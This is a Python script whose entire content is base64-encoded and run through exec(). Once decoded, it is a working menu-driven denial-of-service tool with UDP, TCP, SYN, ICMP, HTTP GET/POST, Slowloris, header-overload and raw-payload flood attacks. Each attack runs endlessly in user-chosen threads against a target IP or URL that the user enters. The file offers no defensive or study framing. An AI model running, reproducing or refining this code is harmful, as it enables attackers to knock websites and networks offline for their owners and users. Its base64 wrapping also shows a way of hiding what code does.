#!/usr/bin/env python3
# File encryptedGithub: Xvenn-03
import base64
exec(__import__('base64').b64decode('aW1wb3J0IHRocmVhZGluZwppbXBvcnQgc29ja2V0CmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IG9zCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIFN0eWxlLCBGb3JlCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFzaWMgVXNhZ2UKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KaW5pdCgpCmRlZiB1c2FnZSgpOgogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBwcmludChGb3JlLlJFRCsiIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIApOTk5OTk5OTiAgICAgICAgTk5OTk5OTk5QUFBQUFBQUFBQUFBQUFBQUCAgIE5OTk5OTk5OICAgICAgICBOTk5OTk5OTkREREREREREREREREQgICAgICAgICAgICAgT09PT09PT09PICAgICAgICBTU1NTU1NTU1NTU1NTU1MgCk46Ojo6Ojo6TiAgICAgICBOOjo6Ojo6TlA6Ojo6Ojo6Ojo6Ojo6Ojo6UCAgTjo6Ojo6OjpOICAgICAgIE46Ojo6OjpORDo6Ojo6Ojo6Ojo6OkRERCAgICAgICAgT086Ojo6Ojo6OjpPTyAgICBTUzo6Ojo6Ojo6Ojo6Ojo6OlMKTjo6Ojo6Ojo6TiAgICAgIE46Ojo6OjpOUDo6Ojo6OlBQUFBQUDo6Ojo6UCBOOjo6Ojo6OjpOICAgICAgTjo6Ojo6Ok5EOjo6Ojo6Ojo6Ojo6Ojo6REQgICAgT086Ojo6Ojo6Ojo6Ojo6T08gUzo6Ojo6U1NTU1NTOjo6Ojo6UwpOOjo6Ojo6Ojo6TiAgICAgTjo6Ojo6Ok5QUDo6Ojo6UCAgICAgUDo6Ojo6UE46Ojo6Ojo6OjpOICAgICBOOjo6Ojo6TkRERDo6Ojo6REREREQ6Ojo6OkQgIE86Ojo6Ojo6T09POjo6Ojo6Ok9TOjo6OjpTICAgICBTU1NTU1NTCk46Ojo6Ojo6Ojo6TiAgICBOOjo6Ojo6TiAgUDo6OjpQICAgICBQOjo6OjpQTjo6Ojo6Ojo6OjpOICAgIE46Ojo6OjpOICBEOjo6OjpEICAgIEQ6Ojo6OkQgTzo6Ojo6Ok8gICBPOjo6Ojo6T1M6Ojo6OlMgICAgICAgICAgICAKTjo6Ojo6Ojo6Ojo6TiAgIE46Ojo6OjpOICBQOjo6OlAgICAgIFA6Ojo6OlBOOjo6Ojo6Ojo6OjpOICAgTjo6Ojo6Ok4gIEQ6Ojo6OkQgICAgIEQ6Ojo6OkRPOjo6OjpPICAgICBPOjo6OjpPUzo6Ojo6UyAgICAgICAgICAgIApOOjo6Ojo6Ok46Ojo6TiAgTjo6Ojo6Ok4gIFA6Ojo6UFBQUFBQOjo6OjpQIE46Ojo6Ojo6Tjo6OjpOICBOOjo6Ojo6TiAgRDo6Ojo6RCAgICAgRDo6Ojo6RE86Ojo6Ok8gICAgIE86Ojo6Ok8gUzo6OjpTU1NTICAgICAgICAgCk46Ojo6OjpOIE46Ojo6TiBOOjo6Ojo6TiAgUDo6Ojo6Ojo6Ojo6OjpQUCAgTjo6Ojo6Ok4gTjo6OjpOIE46Ojo6OjpOICBEOjo6OjpEICAgICBEOjo6OjpETzo6Ojo6TyAgICAgTzo6Ojo6TyAgU1M6Ojo6OjpTU1NTUyAgICAKTjo6Ojo6Ok4gIE46Ojo6Tjo6Ojo6OjpOICBQOjo6OlBQUFBQUFBQUCAgICBOOjo6Ojo6TiAgTjo6OjpOOjo6Ojo6Ok4gIEQ6Ojo6OkQgICAgIEQ6Ojo6OkRPOjo6OjpPICAgICBPOjo6OjpPICAgIFNTUzo6Ojo6Ojo6U1MgIApOOjo6Ojo6TiAgIE46Ojo6Ojo6Ojo6Ok4gIFA6Ojo6UCAgICAgICAgICAgIE46Ojo6OjpOICAgTjo6Ojo6Ojo6Ojo6TiAgRDo6Ojo6RCAgICAgRDo6Ojo6RE86Ojo6Ok8gICAgIE86Ojo6Ok8gICAgICAgU1NTU1NTOjo6OlMgCk46Ojo6OjpOICAgIE46Ojo6Ojo6Ojo6TiAgUDo6OjpQICAgICAgICAgICAgTjo6Ojo6Ok4gICAgTjo6Ojo6Ojo6OjpOICBEOjo6OjpEICAgICBEOjo6OjpETzo6Ojo6TyAgICAgTzo6Ojo6TyAgICAgICAgICAgIFM6Ojo6OlMKTjo6Ojo6Ok4gICAgIE46Ojo6Ojo6OjpOICBQOjo6OlAgICAgICAgICAgICBOOjo6Ojo6TiAgICAgTjo6Ojo6Ojo6Ok4gIEQ6Ojo6OkQgICAgRDo6Ojo6RCBPOjo6Ojo6TyAgIE86Ojo6OjpPICAgICAgICAgICAgUzo6Ojo6UwpOOjo6Ojo6TiAgICAgIE46Ojo6Ojo6Ok5QUDo6Ojo6OlBQICAgICAgICAgIE46Ojo6OjpOICAgICAgTjo6Ojo6Ojo6TkRERDo6Ojo6REREREQ6Ojo6OkQgIE86Ojo6Ojo6T09POjo6Ojo6Ok9TU1NTU1NTICAgICBTOjo6OjpTCk46Ojo6OjpOICAgICAgIE46Ojo6Ojo6TlA6Ojo6Ojo6OlAgICAgICAgICAgTjo6Ojo6Ok4gICAgICAgTjo6Ojo6OjpORDo6Ojo6Ojo6Ojo6Ojo6OkREICAgIE9POjo6Ojo6Ojo6Ojo6Ok9PIFM6Ojo6OjpTU1NTU1M6Ojo6OlMKTjo6Ojo6Ok4gICAgICAgIE46Ojo6OjpOUDo6Ojo6Ojo6UCAgICAgICAgICBOOjo6Ojo6TiAgICAgICAgTjo6Ojo6Ok5EOjo6Ojo6Ojo6Ojo6REREICAgICAgICBPTzo6Ojo6Ojo6Ok9PICAgUzo6Ojo6Ojo6Ojo6Ojo6OlNTIApOTk5OTk5OTiAgICAgICAgIE5OTk5OTk5QUFBQUFBQUFBQICAgICAgICAgIE5OTk5OTk5OICAgICAgICAgTk5OTk5OTkREREREREREREREREQgICAgICAgICAgICAgT09PT09PT09PICAgICAgU1NTU1NTU1NTU1NTU1NTICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIiIiK1N0eWxlLlJFU0VUX0FMTCsiIiJHaXRodWI6IFh2ZW5uLTAzCuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAoKQVRUQUNLIE9QVElPTjoKICBbMV0gVURQIEZsb29kCiAgWzJdIFRDUCBGbG9vZAogIFszXSBIVFRQIEdFVCBGbG9vZAogIFs0XSBUQ1AgU1lOIEZsb29kCiAgWzVdIEhUVFAgUE9TVCBGbG9vZAogIFs2XSBTbG93bG9yaXMgQXR0YWNrCiAgWzddIElDTVAgUGluZyBGbG9vZAogIFs4XSBSYW5kb20gUGFja2V0IEZsb29kCiAgWzldIEhUVFAgSGVhZGVyIE92ZXJsb2FkCiAgWzEwXSBIVFRQIFJBVyBQYXlsb2FkIEF0dGFjawogIFsxMV0gQ2hlY2sgSVAgQWRkcmVzcwogICAgIiIiKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEF0dGFjayBGdW5jdGlvbnMKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKZGVmIHVkcF9mbG9vZChpcCwgcG9ydCwgcGFja2V0cyk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICAgICAgICBhZGRyID0gKHN0cihpcCksIGludChwb3J0KSkKICAgICAgICAgICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxMDI0KQogICAgICAgICAgICBmb3IgXyBpbiByYW5nZShwYWNrZXRzKToKICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKGRhdGEsIGFkZHIpCiAgICAgICAgICAgIHByaW50KGYiW1VEUF0gQXR0YWNraW5nIHtpcH06e3BvcnR9IikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiB0Y3BfZmxvb2QoaXAsIHBvcnQsIHBhY2tldHMpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHNvY2suY29ubmVjdCgoaXAsIHBvcnQpKQogICAgICAgICAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwMjQpCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHMpOgogICAgICAgICAgICAgICAgc29jay5zZW5kKGRhdGEpCiAgICAgICAgICAgIHByaW50KGYiW1RDUF0gQXR0YWNraW5nIHtpcH06e3BvcnR9IikKICAgICAgICAgICAgc29jay5jbG9zZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgaHR0cF9nZXRfZmxvb2QodXJsLCBwYWNrZXRzKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkiLAogICAgICAgICJDb25uZWN0aW9uIjogImtlZXAtYWxpdmUiCiAgICB9CiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocGFja2V0cyk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgcHJpbnQoZiJbSFRUUC1HRVRdIHt1cmx9IFN0YXR1czoge3Iuc3RhdHVzX2NvZGV9IikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBzeW5fZmxvb2QoaXAsIHBvcnQsIHBhY2tldHMpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19SQVcsIHNvY2tldC5JUFBST1RPX1RDUCkKICAgICAgICAgICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxMDI0KQogICAgICAgICAgICBhZGRyID0gKGlwLCBwb3J0KQogICAgICAgICAgICBmb3IgXyBpbiByYW5nZShwYWNrZXRzKToKICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKGRhdGEsIGFkZHIpCiAgICAgICAgICAgIHByaW50KGYiW1NZTl0gRmxvb2Rpbmcge2lwfTp7cG9ydH0iKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKZGVmIGh0dHBfcG9zdF9mbG9vZCh1cmwsIHBhY2tldHMpOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCIsCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiCiAgICB9CiAgICBwYXlsb2FkID0gInBhcmFtPSIgKyAiQSIgKiAxMDAwCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocGFja2V0cyk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1wYXlsb2FkKQogICAgICAgICAgICAgICAgcHJpbnQoZiJbSFRUUC1QT1NUXSB7dXJsfSBTdGF0dXM6IHtyLnN0YXR1c19jb2RlfSIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgc2xvd2xvcmlzX2F0dGFjayhpcCwgcG9ydCk6CiAgICBzb2NrZXRzID0gW10KICAgIHRyeToKICAgICAgICBmb3IgXyBpbiByYW5nZSgyMDApOgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgICAgICBzLnNldHRpbWVvdXQoNCkKICAgICAgICAgICAgcy5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgICAgIHMuc2VuZCgiR0VUIC8/e30gSFRUUC8xLjFcclxuIi5mb3JtYXQocmFuZG9tLnJhbmRpbnQoMCwgMTAwMCkpLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgc29ja2V0cy5hcHBlbmQocykKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBmb3IgcyBpbiBzb2NrZXRzOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHMuc2VuZCgiWC1hOiB7fVxyXG4iLmZvcm1hdChyYW5kb20ucmFuZGludCgxLCA1MDAwKSkuZW5jb2RlKCd1dGYtOCcpKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHNvY2tldHMucmVtb3ZlKHMpCiAgICAgICAgICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIHByaW50KGYiW1Nsb3dsb3Jpc10gSG9sZGluZyB7bGVuKHNvY2tldHMpfSBjb25uZWN0aW9ucy4iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDE1KQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiBpY21wX2Zsb29kKGlwLCBwYWNrZXRzKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgXyBpbiByYW5nZShwYWNrZXRzKToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbShmInBpbmcge2lwfSAtbCA2NTUwMCAtbiAxIikKICAgICAgICAgICAgcHJpbnQoZiJbSUNNUF0gUGluZyBmbG9vZCB7aXB9IikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiByYW5kb21fZmxvb2QoaXAsIHBvcnQsIHBhY2tldHMpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgICAgICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSg0MDk2KQogICAgICAgICAgICBhZGRyID0gKHN0cihpcCksIGludChwb3J0KSkKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocGFja2V0cyk6CiAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhkYXRhLCBhZGRyKQogICAgICAgICAgICBwcmludChmIltSQU5ET01dIEZsb29kaW5nIHtpcH06e3BvcnR9IikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBoZWFkZXJfb3ZlcmxvYWQodXJsLCBwYWNrZXRzKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBoZWFkZXJzID0ge2YiWC1DdXN0b20te2l9IjogIkEiKjEwMDAgZm9yIGkgaW4gcmFuZ2UoMTAwKX0KICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocGFja2V0cyk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgcHJpbnQoZiJbSGVhZGVyT3ZlcmxvYWRdIHt1cmx9IFN0YXR1czoge3Iuc3RhdHVzX2NvZGV9IikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiByYXdfcGF5bG9hZF9hdHRhY2sodXJsLCBwYWNrZXRzKToKICAgIHBheWxvYWQgPSByYW5kb20uX3VyYW5kb20oNTAwMCkKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iLAogICAgICAgICJVc2VyLUFnZW50IjogIkN1c3RvbS1SYXctQXR0YWNrIgogICAgfQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHMpOgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPXBheWxvYWQsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgICAgIHByaW50KGYiW1JBVy1QYXlsb2FkXSB7dXJsfSBTdGF0dXM6IHtyLnN0YXR1c19jb2RlfSIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENoZWNrIElQIEZ1bmN0aW9uCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpkZWYgY2hlY2tfaXAoZG9tYWluKToKICAgIHRyeToKICAgICAgICBpcCA9IHNvY2tldC5nZXRob3N0YnluYW1lKGRvbWFpbikKICAgICAgICBwcmludChmIkRvbWFpbiB7ZG9tYWlufSByZXNvbHZlZCB0byBJUDoge2lwfSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciByZXNvbHZpbmcgZG9tYWluOiB7ZX0iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBNYWluIE1lbnUKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB1c2FnZSgpCiAgICBjaG9pY2UgPSBpbnB1dCgiU2VsZWN0IGFuIG9wdGlvbiAoMS0xMSk6ICIpCgogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBpcCA9IGlucHV0KCJUYXJnZXQgSVA6ICIpCiAgICAgICAgcG9ydCA9IGludChpbnB1dCgiVGFyZ2V0IFBvcnQ6ICIpKQogICAgICAgIHBhY2tldHMgPSBpbnQoaW5wdXQoIlBhY2tldHMgcGVyIHRocmVhZDogIikpCiAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dCgiVGhyZWFkczogIikpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9dWRwX2Zsb29kLCBhcmdzPShpcCwgcG9ydCwgcGFja2V0cykpCiAgICAgICAgICAgIHRoLnN0YXJ0KCkKCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgaXAgPSBpbnB1dCgiVGFyZ2V0IElQOiAiKQogICAgICAgIHBvcnQgPSBpbnQoaW5wdXQoIlRhcmdldCBQb3J0OiAiKSkKICAgICAgICBwYWNrZXRzID0gaW50KGlucHV0KCJQYWNrZXRzIHBlciB0aHJlYWQ6ICIpKQogICAgICAgIHRocmVhZHMgPSBpbnQoaW5wdXQoIlRocmVhZHM6ICIpKQogICAgICAgIGZvciBfIGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXRjcF9mbG9vZCwgYXJncz0oaXAsIHBvcnQsIHBhY2tldHMpKQogICAgICAgICAgICB0aC5zdGFydCgpCgogICAgZWxpZiBjaG9pY2UgPT0gJzMnOgogICAgICAgIHVybCA9IGlucHV0KCJUYXJnZXQgVVJMICh3aXRoIGh0dHAvaHR0cHMpOiAiKQogICAgICAgIHBhY2tldHMgPSBpbnQoaW5wdXQoIlBhY2tldHMgcGVyIHRocmVhZDogIikpCiAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dCgiVGhyZWFkczogIikpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aHR0cF9nZXRfZmxvb2QsIGFyZ3M9KHVybCwgcGFja2V0cykpCiAgICAgICAgICAgIHRoLnN0YXJ0KCkKCiAgICBlbGlmIGNob2ljZSA9PSAnNCc6CiAgICAgICAgaXAgPSBpbnB1dCgiVGFyZ2V0IElQOiAiKQogICAgICAgIHBvcnQgPSBpbnQoaW5wdXQoIlRhcmdldCBQb3J0OiAiKSkKICAgICAgICBwYWNrZXRzID0gaW50KGlucHV0KCJQYWNrZXRzIHBlciB0aHJlYWQ6ICIpKQogICAgICAgIHRocmVhZHMgPSBpbnQoaW5wdXQoIlRocmVhZHM6ICIpKQogICAgICAgIGZvciBfIGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXN5bl9mbG9vZCwgYXJncz0oaXAsIHBvcnQsIHBhY2tldHMpKQogICAgICAgICAgICB0aC5zdGFydCgpCgogICAgZWxpZiBjaG9pY2UgPT0gJzUnOgogICAgICAgIHVybCA9IGlucHV0KCJUYXJnZXQgVVJMICh3aXRoIGh0dHAvaHR0cHMpOiAiKQogICAgICAgIHBhY2tldHMgPSBpbnQoaW5wdXQoIlBhY2tldHMgcGVyIHRocmVhZDogIikpCiAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dCgiVGhyZWFkczogIikpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aHR0cF9wb3N0X2Zsb29kLCBhcmdzPSh1cmwsIHBhY2tldHMpKQogICAgICAgICAgICB0aC5zdGFydCgpCgogICAgZWxpZiBjaG9pY2UgPT0gJzYnOgogICAgICAgIGlwID0gaW5wdXQoIlRhcmdldCBJUDogIikKICAgICAgICBwb3J0ID0gaW50KGlucHV0KCJUYXJnZXQgUG9ydDogIikpCiAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dCgiVGhyZWFkczogIikpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2xvd2xvcmlzX2F0dGFjaywgYXJncz0oaXAsIHBvcnQpKQogICAgICAgICAgICB0aC5zdGFydCgpCgogICAgZWxpZiBjaG9pY2UgPT0gJzcnOgogICAgICAgIGlwID0gaW5wdXQoIlRhcmdldCBJUDogIikKICAgICAgICBwYWNrZXRzID0gaW50KGlucHV0KCJQYWNrZXRzIHBlciB0aHJlYWQ6ICIpKQogICAgICAgIHRocmVhZHMgPSBpbnQoaW5wdXQoIlRocmVhZHM6ICIpKQogICAgICAgIGZvciBfIGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWljbXBfZmxvb2QsIGFyZ3M9KGlwLCBwYWNrZXRzKSkKICAgICAgICAgICAgdGguc3RhcnQoKQoKICAgIGVsaWYgY2hvaWNlID09ICc4JzoKICAgICAgICBpcCA9IGlucHV0KCJUYXJnZXQgSVA6ICIpCiAgICAgICAgcG9ydCA9IGludChpbnB1dCgiVGFyZ2V0IFBvcnQ6ICIpKQogICAgICAgIHBhY2tldHMgPSBpbnQoaW5wdXQoIlBhY2tldHMgcGVyIHRocmVhZDogIikpCiAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dCgiVGhyZWFkczogIikpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cmFuZG9tX2Zsb29kLCBhcmdzPShpcCwgcG9ydCwgcGFja2V0cykpCiAgICAgICAgICAgIHRoLnN0YXJ0KCkKCiAgICBlbGlmIGNob2ljZSA9PSAnOSc6CiAgICAgICAgdXJsID0gaW5wdXQoIlRhcmdldCBVUkwgKHdpdGggaHR0cC9odHRwcyk6ICIpCiAgICAgICAgcGFja2V0cyA9IGludChpbnB1dCgiUGFja2V0cyBwZXIgdGhyZWFkOiAiKSkKICAgICAgICB0aHJlYWRzID0gaW50KGlucHV0KCJUaHJlYWRzOiAiKSkKICAgICAgICBmb3IgXyBpbiByYW5nZSh0aHJlYWRzKToKICAgICAgICAgICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1oZWFkZXJfb3ZlcmxvYWQsIGFyZ3M9KHVybCwgcGFja2V0cykpCiAgICAgICAgICAgIHRoLnN0YXJ0KCkKCiAgICBlbGlmIGNob2ljZSA9PSAnMTAnOgogICAgICAgIHVybCA9IGlucHV0KCJUYXJnZXQgVVJMICh3aXRoIGh0dHAvaHR0cHMpOiAiKQogICAgICAgIHBhY2tldHMgPSBpbnQoaW5wdXQoIlBhY2tldHMgcGVyIHRocmVhZDogIikpCiAgICAgICAgdGhyZWFkcyA9IGludChpbnB1dCgiVGhyZWFkczogIikpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGhyZWFkcyk6CiAgICAgICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cmF3X3BheWxvYWRfYXR0YWNrLCBhcmdzPSh1cmwsIHBhY2tldHMpKQogICAgICAgICAgICB0aC5zdGFydCgpCgogICAgZWxpZiBjaG9pY2UgPT0gJzExJzoKICAgICAgICBkb21haW4gPSBpbnB1dCgiRW50ZXIgZG9tYWluICh3aXRob3V0IGh0dHAvaHR0cHMpOiAiKQogICAgICAgIGNoZWNrX2lwKGRvbWFpbikKCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIG9wdGlvbi4iKQo=').decode('utf-8'))
